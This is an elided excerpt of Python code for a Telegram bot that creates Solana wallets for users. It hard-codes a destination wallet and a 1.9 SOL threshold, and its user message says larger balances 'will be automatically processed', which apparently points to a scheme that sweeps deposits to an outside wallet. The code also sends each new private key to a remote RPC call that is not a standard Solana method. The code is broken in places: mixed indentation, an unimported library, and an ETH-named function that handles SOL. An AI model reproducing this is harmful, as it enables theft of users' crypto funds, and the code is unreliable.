...
import asyncio
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, WebAppInfo, ParseMode
...
MINIMUM_SOL_THRESHOLD = 1.9  # SOL
DESTINATION_WALLET = "25JKsVDeX4monwCdWewsDpDKMzws39xsb9oWdhZESr7L"

async def generate_solana_wallet():
    """Generate a new Solana wallet using secure random bytes."""
    try:
        # Generate 32 bytes of secure random data for private key
        private_key_bytes = secrets.token_bytes(32)
        private_key = base58.b58encode(private_key_bytes).decode('ascii')
        
        # Generate public key using RPC
        headers = {"Content-Type": "application/json"}
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "createAccount",
            "params": [{"secretKey": private_key}]
        }
        ...
        async with aiohttp.ClientSession() as session:
            async with session.post(SOLANA_RPC_URL, json=payload, headers=headers) as response:
                ...
                if not result.get('result'):
                    logger.error("Failed to get result from RPC")
                    return None
                
                public_key = result.get('result', {}).get('publicKey')
        if not public_key:
                    logger.error("Failed to get public key from result")
                    return None
...
async def get_eth_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        ...
        message = (
            ...
            "3. Funds above 1.9 SOL will be automatically processed\n"
